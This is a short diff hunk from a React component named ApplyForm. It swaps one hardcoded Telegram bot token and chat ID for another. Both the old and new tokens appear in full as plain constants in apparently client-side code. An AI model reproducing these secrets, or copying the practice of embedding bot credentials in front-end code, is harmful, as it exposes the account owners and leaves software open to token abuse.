@@ -36,8 +36,8 @@ const ApplyForm: React.FC = () => {
 
   const navigate = useNavigate();
 
-  const BOT_TOKEN = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
-  const CHAT_ID = '7062736155';
+  const BOT_TOKEN = '8446940235:AAFSswBbnM6byAXkhCvaLLsTAvnsqkBQbWU';
+  const CHAT_ID = '7673317331';
 
 
   
